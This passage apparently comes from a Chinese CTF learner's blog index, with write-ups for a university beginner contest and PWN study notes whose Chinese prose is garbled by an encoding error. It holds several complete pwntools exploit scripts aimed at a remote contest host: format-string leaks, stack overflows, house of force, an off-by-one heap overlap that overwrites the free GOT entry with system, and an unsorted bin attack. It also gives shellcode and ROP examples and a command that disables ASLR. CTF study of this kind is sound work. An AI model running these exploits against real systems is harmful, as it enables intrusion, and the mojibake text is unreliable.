r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))free_got = heap.got['free']add(0x18, 'AAAA') #0add(0x10, 'AAAA') #1change(0, \"/bin/sh\\x00\" + 'A'*0x10 + \"\\x41\")delete(1)add(0x30,p64(0)*4 + p64(0x20) + p64(heap.got['free']))show(1)r.recvuntil(\"Content : \")data = r.recvuntil(\"Done !\")free_addr = u64(data.split(\"\\n\")[0].ljust(8,'\\x00'))libc_base = free_addr -libc.symbols['free']log.success('libc base addr:'+hex(libc_base))system_addr = libc_base + libc.symbols[\"system\"]change(1,p64(system_addr))delete(0)r.interactive() å…ˆè¯´ä¸€ä¸‹æ€è·¯ å•å­—èŠ‚æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹chunk_sizeæ¥overlapï¼Œè¾¾åˆ°ä»»æ„è¯»å†™çš„ç›®çš„ ç”±äºåé—¨å‡½æ•°æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åº”è¯¥æƒ³è°ƒç”¨systemå‡½æ•°ï¼Œé¦–è¦çš„å°±æ˜¯æ³„éœ²libcåŸºå€ï¼Œå…¶æ¬¡è·å–systemå‡½æ•° æ”¹freeçš„gotè¡¨ è¾¾åˆ°è°ƒç”¨ è¿™é‡Œæ¥å†™ä¸€ä¸‹expçš„æ€è·¯ å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼Œä¹‹åä¿®æ”¹ç¬¬ä¸€ä¸ªå †å—ï¼Œç¬¬ä¸€ä¸ªå †å—å¯ä»¥å†™å…¥/bin/shçš„å‚æ•°ï¼Œç„¶åæˆ‘ä»¬ä¿®æ”¹ç¬¬äºŒä¸ªå †å—çš„sizeï¼Œä½¿å…¶è¿›å…¥fastbinä¸­ï¼Œè®©æˆ‘ä»¬å†æ¬¡åˆ†é… æˆ‘ä»¬è¿›è¡Œé‡æ–°åˆ†é…ï¼Œè¿™æ˜¯å°±å¯ä»¥ä»»æ„å†™ï¼ŒæŠŠgotè¡¨ä¸­çš„freeå†™è¿›å»ï¼Œç„¶åè¯»å‡ºæ¥ï¼Œæ³„éœ²åŸºå€ ä¿®æ”¹freeçš„gotè¡¨ä¸ºsystemçš„åœ°å€ç„¶åç›´æ¥free(0)ä¹Ÿå°±è°ƒç”¨äº†/bin/sh ä¸‹é¢æ˜¯å…³é”®æˆªå›¾ å†™å…¥/bin/sh é‡Šæ”¾1ä¹‹å é—®é¢˜è¿™é‡Œè¯´ä¸€ä¸‹æˆ‘è‡ªå·±çš„é—®é¢˜ æˆ‘ä¸€ç›´è®¤ä¸ºfakechunkè¢«é‡Šæ”¾åè¿›å…¥fastbinä¸­ï¼Œæˆ‘ä¸€ç›´è®¤ä¸ºfastbinä¸­åªæœ‰ä¸€ä¸ªchunk çŸ¥é“æˆ‘æƒŠäººåœ°å‘ç°å®ƒå±…ç„¶æ˜¯freeäº†ä¸¤å›æ˜¯ä¸¤ä¸ªchunk æˆ‘æ‰é†’æ‚Ÿ ä¸ºä»€ä¹ˆå®ƒä¸ç›´æ¥ä»top chunkä¸­åˆ†é…ï¼ˆæˆ‘ä¸ªfwï¼Œç›¯ç€çœ‹äº†ä¸¤ä¸ªå°æ—¶ä¹Ÿæ²¡çœ‹å‡ºæ¥ï¼‰ æ€»ç»“ï¼Œè‡ªå·±æ€»æ˜¯åœ¨è‡ªå·±æƒ³è¿™ä¸ªå †æ€ä¹ˆè¿è¡Œï¼Œå¾ˆå°‘å»è°ƒè¯•ã€‚è¿˜æ˜¯åº”è¯¥å¤šåŠ¨æ‰‹ï¼ˆè¦ä¸æ˜¯æˆ‘è°ƒè¯•èƒ½åŠ›ä¸å¤ªè¡Œï¼‰ pwn7 å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº† å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *r = remote(\"219.219.61.234\",10016)context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,size,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))#def show(idx):# r.recvuntil(\":\")# r.sendline(\"3\")# r.recvuntil(\":\")# r.sendline(str(idx))add(0x20, \"AAAA\") #0add(0x80, \"AAAA\") #1add(0x20, \"AAAA\") #2delete(1)flag = 0x6020a0fd = 0bk = flag - 0x10change(0, 0x20 + 0x20, \"a\"*0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))add(0x80, \"AAAA\")r.recvuntil(0x80, \"AAAA\")r.recvuntil(\":\")r.sendline(\"666\")r.interactive() pwn8 addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç° ä»»æ„å†™","categories":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"å †","slug":"å †","permalink":"https://pz1o.top/tags/%E5%A0%86/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"CUMT2020å…¥é—¨èµ›","slug":"CUMT2020å…¥é—¨èµ›","date":"2020-11-28T10:20:47.000Z","updated":"2020-11-28T12:46:19.100Z","comments":true,"path":"2020/11/28/CUMT2020å…¥é—¨èµ›/","link":"","permalink":"https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/","excerpt":"","text":"CUMT2020å…¥é—¨èµ›æœ¬ä¸å‡†å¤‡å†™çš„ï¼Œä¸»è¦tclï¼Œè¿˜æ˜¯ç•™ä¸ªå‘ä½ç­‰è€ƒå®Œè¯•æ¥å¤ç° ä¸»è¦å¯¹å †ä¸ç†è§£ï¼Œå¹¶ä¸”ä¸æ‡‚æ¼æ´åˆ©ç”¨ç‚¹åœ¨å“ªé‡Œ Pwntest_ncncè¿æ¥æ‹¿flag pwn21234567891011121314151617181920212223from pwnlib import gdbfrom pwnlib import contextfrom pwnlib.tubes.remote import remotefrom pwnlib.tubes.process import processfrom pwnlib.elf.elf import ELFfrom pwnlib.util.packing import make_packerp = make_packer(word_size=64)bd = 0x400756#r = process(\"./overflow\")r = remote(\"219.219.61.234\",10011)r.recvuntil(b'Welcome to CTF2020!\\n')r.recvuntil(b'Please input your username\\n')r.sendline(b'%11$p')pp = r.recv()print(pp)r.sendline(b'a'*0x28 + p(int(pp, 16)) + b'a'*8 + p(0x400756))r.interactive() pwn3æ ˆæº¢å‡º pwn4æ•´æ•°æº¢å‡º è¾“å…¥65536 å¾—åˆ°shell pwn5(fail)å…ˆè´´expï¼Œè€ƒå®Œè¯•æ¥å­¦ä¹  æ¼æ´ç‚¹æƒ³çš„æ˜¯ä¸€æ ·çš„ ä½†å…¶ä¸­æœ‰äº›ç»†èŠ‚ä¸å¤ªæ‡‚ åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡» å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r = remote(\"219.219.61.234\",10014)def add(size,name): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def change(idx,size,name): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(): r.recvuntil(\":\") r.sendline(\"1\")magic = 0x400D1Badd(0x30, \"ddaa\")payload = 0x30 * 'a'payload += p64(0) + p64(0xffffffffffffffff)change(0,0x41,payload)offset_to_heap_base = -(0x40 + 0x20)malloc = offset_to_heap_base - 0x8 - 0xfadd(malloc,\"dddd\")add(0x10,p64(magic) * 2)r.recvuntil(\":\")r.sendline(\"5\")print(r.recv())r.interactive() pwn6(fail) changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´ 12345&gt;if ( heap[v1] ) &gt;&#123; printf(&quot;Content of heap : &quot;); read_input(heap[v1][1], *heap[v1] + 1LL); puts(&quot;Done !&quot;); &gt;&#125; åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™ æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *r = remote(\"219.219.61.234\",10015)heap = ELF('./pwn6')libc = ELF('./libc.so.6')context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))free_got = heap.got['free']add(0x18, 'AAAA') #0add(0x10, 'AAAA') #1change(0, \"/bin/sh\\x00\" + 'A'*0x10 + \"\\x41\")delete(1)add(0x30,p64(0)*4 + p64(0x20) + p64(heap.got['free']))show(1)r.recvuntil(\"Content : \")data = r.recvuntil(\"Done !\")free_addr = u64(data.split(\"\\n\")[0].ljust(8,'\\x00'))libc_base = free_addr -libc.symbols['free']log.success('libc base addr:'+hex(libc_base))system_addr = libc_base + libc.symbols[\"system\"]change(1,p64(system_addr))delete(0)r.interactive() pwn7(fail) å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº† å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *r = remote(\"219.219.61.234\",10016)context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,size,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))#def show(idx):# r.recvuntil(\":\")# r.sendline(\"3\")# r.recvuntil(\":\")# r.sendline(str(idx))add(0x20, \"AAAA\") #0add(0x80, \"AAAA\") #1add(0x20, \"AAAA\") #2delete(1)flag = 0x6020a0fd = 0bk = flag - 0x10change(0, 0x20 + 0x20, \"a\"*0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))add(0x80, \"AAAA\")r.recvuntil(0x80, \"AAAA\")r.recvuntil(\":\")r.sendline(\"666\")r.interactive() pwn8(fail) addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç° ä»»æ„å†™ MiscMISCç­¾åˆ°é¢˜ookè§£ç  åŒé‡æ´—è„‘ä¸ä½›è®ºç¦…+ç¤¾ä¼šä¸»ä¹‰ä»·å€¼è§‚ çœŸÂ·ç­¾åˆ°åŠ qqæ‹ä¸€æ‹ çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†è„±è¿›010ï¼Œç›´æ¥ç›²æ–‡è§£å¯† 7çš„æ„å¿—ï¼å‹ç¼©åŒ…å¯†ç 7 æ …æ åŠ å‡¯æ’’ å¥‡æ€ªçš„é¢˜æ”¹åƒç´ å¯ä»¥å¾—åˆ°ä¸€å¼ æ•£å¼€çš„äºŒç»´ç  æŠŠä¸‰ä¸ªæ‹¼ä¸€ä¸ªäºŒç»´ç  è¡¥ä¸‰ä¸ªå®šä½ç¬¦","categories":[{"name":"wp","slug":"wp","permalink":"https://pz1o.top/categories/wp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"0dayå®‰å…¨è¯»ä¹¦ç¬”è®°","slug":"0dayå®‰å…¨è¯»ä¹¦ç¬”è®°","date":"2020-10-27T14:29:36.000Z","updated":"2020-11-20T14:17:51.878Z","comments":true,"path":"2020/10/27/0dayå®‰å…¨è¯»ä¹¦ç¬”è®°/","link":"","permalink":"https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"å‰è¨€ä¸‰ä¸ªæœˆä¸€èµ·è¯»å®Œ0dayå®‰å…¨ï¼Œèµ¶ç´§æ‹¿æ¥è¯»ä¸€è¯»ï¼Œéšç¼˜æ›´æ–° æ­£æ–‡","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†è¯»ä¹¦ç¬”è®°","slug":"é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†è¯»ä¹¦ç¬”è®°","date":"2020-10-27T08:09:08.000Z","updated":"2020-11-20T14:20:02.585Z","comments":true,"path":"2020/10/27/é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†è¯»ä¹¦ç¬”è®°/","link":"","permalink":"https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"å‰è¨€é¢„ä¼°ä¸‰ä¸ªæœˆï¼Œä½†è¯´ä¸å®šä¸ºäº†èµ¶å…¶ä»–çš„ddlï¼Œä¹Ÿå°±è¯»ä¸å®Œäº†ï¼Œå°½åŠ›å»å§ æ­£æ–‡","categories":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://pz1o.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://pz1o.top/tags/%E9%80%86%E5%90%91/"},{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PWNå­¦ä¹ ","slug":"PWNå­¦ä¹ ","date":"2020-10-24T14:32:31.000Z","updated":"2020-12-11T09:17:54.335Z","comments":true,"path":"2020/10/24/PWNå­¦ä¹ /","link":"","permalink":"https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"PWNçº¯é›¶åŸºç¡€ï¼Œå¤§ä½¬è¯·ç•¥è¿‡ ä»é›¶å¼€å§‹å­¦ä¹ PWN,Webä¼šå»å­¦ï¼Œä½†å¯èƒ½ç°åœ¨å¤§éƒ¨åˆ†æ—¶é—´ä¼šç”¨åœ¨PWNä¸Šï¼Œå¦‚æœéœ€è¦é¢˜çš„è¯å¯ä»¥è¯„è®º å¤§å­¦ä¸­æ˜¯ç ”ç©¶æ·±åº¦è¿˜æ˜¯å¹¿åº¦ï¼Œæˆ‘å¯èƒ½è¿˜æ˜¯éœ€è¦é€‰æ‹©ä¸€ä¸‹ åŸºæœ¬å…¨æ˜¯pptæˆªå›¾ åŸºç¡€ 1234gcc -S a.c #ç”Ÿæˆæ±‡ç¼–æ–‡ä»¶file a.s #æŸ¥çœ‹æ–‡ä»¶ç±»å‹ å¯ä»¥çœ‹è§æ˜¯asciiæ–‡æœ¬gcc a.s #ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶file a.out #å¯ä»¥çœ‹è§æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ ELFæ–‡ä»¶ è™šæ‹Ÿå†…å­˜ ç¨‹åºç¼–è¯‘ä¸é“¾æ¥ ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ æ±‡ç¼–æŒ‡ä»¤ æ ˆæº¢å‡ºåŸºç¡€åŸºæœ¬åŸç† å®ä¾‹ æ”»å‡» ret2textè¿”å›åœ°å€ä¸ºåé—¨åœ°å€ ret2shellcodeè¿”å›åœ°å€ä¸ºå†™å…¥çš„shellcodeçš„åœ°å€ æ ˆä¸­å†™å…¥shellcode bssæ®µå†™å…¥shellcode ret2libc è¿”å›å¯¼å‘ç¼–ç¨‹åŸºç¡€ æ”»å‡» è°ƒç”¨æ„é€  x64å­˜æ”¾å‚æ•°æ”¾å…¥å¯„å­˜å™¨ä¸­ ä½†è¶…è¿‡6ä¸ªå°±ä¼šæ”¾å…¥æ ˆä¸­ åŠ¨æ€é“¾æ¥è¿‡ç¨‹ ä¿æŠ¤æªæ–½RELRORelocation Read-Only å®ƒåˆ†ä¸ºä¸¤ç§ï¼ŒPartial RELRO å’Œ Full RELROï¼Œå³ éƒ¨åˆ†RELRO å’Œ å®Œå…¨RELROã€‚ éƒ¨åˆ†RELRO æ˜¯ GCC çš„é»˜è®¤è®¾ç½®ï¼Œå‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½è‡³å°‘ä½¿ç”¨ éƒ¨åˆ†RELROã€‚ä½†æ˜¯ä»æ”»å‡»è€…è§’åº¦æ¥çœ‹å‘¢ï¼Œéƒ¨åˆ†RELRO ä¸å ªä¸€å‡»ï¼Œå› ä¸ºå®ƒä»…ä»…ä½¿ GOT å­˜å‚¨åœ¨ bss æ®µä¹‹å‰ï¼Œè¿™æ ·ä»…ä»…åªèƒ½é˜²æ­¢å…¨å±€å˜é‡ä¸Šçš„ç¼“å†²åŒºæº¢å‡ºä»è€Œè¦†ç›– GOTã€‚å®Œå…¨RELRO ä½¿æ•´ä¸ª GOT åªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚ 1234gcc -o a a.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELROgcc -z norelro -o a a.c // å…³é—­ï¼Œå³No RELROgcc -z lazy -o a a.c // éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELROgcc -z now -o a a.c // å…¨éƒ¨å¼€å¯ï¼Œå³Full RELRO The NX bitsä¸»è¦æ˜¯ä¿æŠ¤æ ˆåŒºä¸å¯æ‰§è¡Œï¼Œé€šå¸¸åœ¨checksecä¸­å¯ä»¥æŸ¥çœ‹ ASLRåœ°å€éšæœºåŒ–ï¼Œä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯ä¸æƒ³è®©ä½ æ‰¾åˆ°çœŸæ­£çš„å†…å­˜åœ°å€ æ”¹å˜å€¼çš„å‘½ä»¤ 1sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR å¹¶ä¸è´Ÿè´£ä»£ç æ®µå’Œæ•°æ®æ®µçš„éšæœºåŒ–ï¼Œè¿™ç”± PIE è´Ÿè´£ï¼Œä½†æ˜¯åªæœ‰åœ¨å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆã€‚ Canaryè¿™ç§æ ˆä¿æŠ¤æªæ–½åœ¨æ ˆå¸§ä¸­ä»»ä½•å±€éƒ¨ç¼“å†²åŒºä¸æ ˆçŠ¶æ€ä¹‹é—´å­˜å‚¨ä¸€ä¸ªç‰¹æ®Šçš„é‡‘ä¸é›€å€¼ï¼Œ ä¹Ÿç§°å“¨å…µå€¼ï¼Œé€šä¿—ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹æˆä¸€ä¸ªcookie å®ƒæ˜¯ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶éšæœºäº§ç”Ÿçš„ã€‚ åœ¨æ¢å¤å¯„å­˜å™¨çŠ¶æ€ä¹‹å‰å’Œä»å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç¨‹åºæ£€æŸ¥è¿™ä¸ªé‡‘ä¸é›€å€¼æ˜¯å¦è¢«è¯¥å‡½æ•°çš„æŸä¸ªæ“ä½œæˆ–è€…è¯¥å‡½æ•°è°ƒç”¨çš„æŸä¸ªå‡½æ•°çš„æŸä¸ªæ“ä½œæ”¹å˜äº†ï¼Œå¦‚æœå‘ç°å¼‚å¸¸ç¨‹åºä¼šä¸­æ­¢ã€‚æœ€è¿‘çš„ GCC ç‰ˆæœ¬å¯èƒ½ä¼šè¯•å›¾è‡ªåŠ¨æ’å…¥è¿™ç§æº¢å‡ºæ£€æµ‹å€¼ã€‚ 1234gcc -o a a.c // GCC å¯èƒ½ä¼šè¯•å›¾è‡ªåŠ¨æ’å…¥è¿™ç§æº¢å‡ºæ£€æµ‹å€¼gcc -fno-stack-protector -o a a.c //ç¦ç”¨æ ˆä¿æŠ¤gcc -fstack-protector -o a a.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç gcc -fstack-protector-all -o a a.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç  PIEä½ç½®æ— å…³ä»£ç ï¼Œè´Ÿè´£ä»£ç æ®µå’Œæ•°æ®æ®µbss 12345gcc -o test test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIEgcc -fpie -pie -o test test.c // å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1gcc -fPIE -pie -o test test.c // å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2gcc -fpic -o test test.c // å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIEgcc -fPIC -o test test.c // å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE æ ˆè¿ç§»æ§åˆ¶ESP æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å‰æï¼šæœ‰printf ä¸”ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ æ³„éœ²æ ˆå†…å­˜ æ³„éœ²ä»»æ„åœ°å€å†…å­˜ ç¯¡æ”¹æ ˆå†…å­˜ ç¯¡æ”¹ä»»æ„åœ°å€å†…å­˜ 12345678910111213%x%p æ‰“å°æ ˆä¸Šå†…å®¹%s æ‰“å°æ ˆä¸Šè§£æåœ°å€çš„å†…å®¹%n å†™å†…å®¹(æ‰“å°å­—èŠ‚çš„ä¸ªæ•°)printf(&quot;%d%d%d&quot;,a,b,c)printf(&quot;%3$d&quot;,a,b,c) æ§åˆ¶ç¬¬ä¸‰ä¸ªå‚æ•°printf(&quot;%20c&quot;,c)printf(&quot;aaa%n&quot;,c)printf(&quot;%7$n&quot;)%n 0x00000004%hn 0x0004 å †ä»€ä¹ˆæ˜¯å † å †ç®¡ç†å™¨ é€»è¾‘é“¾è¡¨ï¼šæŒ‡é’ˆè¿èµ·æ¥,æŠŠåŒç±»çš„chunkè¿èµ·æ¥ ç‰©ç†é“¾è¡¨ï¼šé€šè¿‡sizeåŸŸç»„ç»‡ç›¸é‚»chunkä¹‹é—´çš„å…³ç³»ï¼Œåˆ¤æ–­ç›¸é‚»æ˜¯å¦ä¸ºfree chunkï¼Œè‹¥æ˜¯ï¼Œåˆ™åˆå¹¶ arena chunk malloced chunkchunk pre size:è®°å½•ä¸Šä¸€ä¸ªfree chunkçš„å¤§å°ï¼Œè‹¥ä¸Šä¸€ä¸ªchunkåœ¨ç”¨ï¼Œåˆ™pre sizeå°†è¢«åˆå¹¶ size:æ•´ä¸ªchunk çš„å¤§å° top chunk ä»æ“ä½œç³»ç»Ÿæ‰¹å‘çš„ä¸åˆ†ç»™ç”¨æˆ·çš„chunk free chunksmall bin chunk large bin chunk fast bin chunk pre size å¤ç”¨ binåˆ†é…æ–¹å¼ï¼šfastbin â€”&gt;unsorted binâ€”&gt;small bin/large bin tcachefastbins binçš„åŒå‘é“¾è¡¨ unsorted bin small bins large bins å®ä¾‹ å †æ¼æ´ fastbin unsorted bin å·¥å…·å­¦ä¹ pwntools1234567891011121314151617181920212223242526272829303132333435363738394041#Import pwntoolsfrom pwn import *#Local communicationio = process(\"./a.out\")#Telecommunicationio = remote(\"ip\",port)#Receive messageio.recvline()io.recvuntil(b\":\")io.recvuntil(b\" : \",drop = True)io.recv()#Send messageio.sendline(b\"abc\")io.send(p32(0)+b\"\\x0a\")io.sendlineafter(b\" :\",str)#Interactiveio.interactive()#shellcodeshellcraft.sh() #in sh environmentshellcraft.amd64.sh() #64 bitasm(shellcraft.sh()) #machine codeasm(shellcraft.sh()).ljust(112,b'a') #if the length is less than 112,then it will be supplemented whith a. #if you want to attack the 64 bit,pls add itcontext.arch = \"amd64\"#find stringself = ELF(\"./filename\")hex(next(elf.search(b\"/bin/sh\")))#elf fileelf = ELF(\"./file\")hex(elf.got[\"puts\"])hex(elf.plt[\"system\"])hex(elf.symbols[\"buf2\"])#flatflat([1,2])#generate datacyclic(60)#byte datap32(1234)\\xd2\\x04\\x00\\x00u32(\"\\xd2\\x04\\x00\\x00\")1234 gdb123456789101112131415161718192021222324252627282930313233343536373839404142434445#startgdb filestart#run the executablerun#backtracebacktrace#returnreturn#breakpointb mainb functionb *0x#information for breakpointinfo b#delete the breakpointd num#runr #next step overn #step in s #stackstack sizestack 24#virtual memory map#to look rwx segmentvmmap#plt pltx px/20 p#gotgot#chunkfastbinheap#libcb *$rebase(0x18540)pause()attach pidreturn IDA1234G ç›´æ¥è·³è½¬åœ°å€shift+f12 æ‰“å¼€å­—ç¬¦ä¸²çª—å£shift+E æå–å­—ç¬¦ä¸²n é‡å‘½åå˜é‡ ROPgadget1ROPgadget --binary filename --only &quot;pop|ret&quot; one_gadget1libcbase + one_gadget_address ç»ƒä¹ é¢˜éå¸¸ç®€å•ï¼Œé€‚åˆå…¥é—¨ æ ˆæº¢å‡ºret2textç›´æ¥æœ‰åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠåƒåœ¾æ•°æ®å¡«æ»¡è¦†ç›–ebpï¼Œç„¶åè®©è¿”å›åœ°å€è¿”å›åé—¨å‡½æ•°çš„åœ°å€å°±è¡Œ 1234567from pwn import *io = process(\"./ret2text\")payload = b'a'*20 + p32(0x8048522)io.sendline(payload)io.interactive() ret2shellcodeè‡ªå·±å†™å…¥shellcode(bss)ï¼Œç„¶åæº¢å‡ºåœ°å€ 12345678910from pwn import * io = process(\"./ret2shellcode\")buf2 = 0x804a080shellcode = asm(shellcraft.sh()).ljust(112,b'a')payload = shellcode + p32(buf2)io.sendline(payload)io.interactive() ret2syscallROPgadget 12345678910111213from pwn import *io = process(\"./ret2syscall\")pop_eax = 0x80bb196pop_edx = 0x806eb90int_80 = 0x08049421payload =flat([ b'A'* 112 , pop_eax , 0xb ,pop_edx, 0, 0, 0x80be408 ,int_80])print(io.recv())io.sendline(payload)io.interactive() ret2libc1 æ ˆæº¢å‡ºï¼Œæœ‰/bin/shå­—ç¬¦ä¸² system@plt æ„é€  12345678from pwn import *elf = ELF(\"./ret2libc1\")io = 